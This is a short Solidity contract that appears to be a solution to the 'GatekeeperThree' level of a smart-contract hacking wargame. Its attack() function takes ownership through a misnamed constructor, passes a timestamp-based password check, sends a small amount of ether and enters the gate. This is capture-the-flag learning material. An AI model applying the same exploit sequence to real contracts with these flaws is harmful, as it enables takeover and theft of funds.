// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../LevelsContracts/#29 GatekeeperThree.sol';

contract GatekeeperThreeHack{
    GatekeeperThree public gatekeeperThree;

    constructor (address payable _gatekeeperThree) payable {
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }
    
    function attack() public {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        payable(address(gatekeeperThree)).transfer(0.0011 ether);     
        gatekeeperThree.enter();
    }
}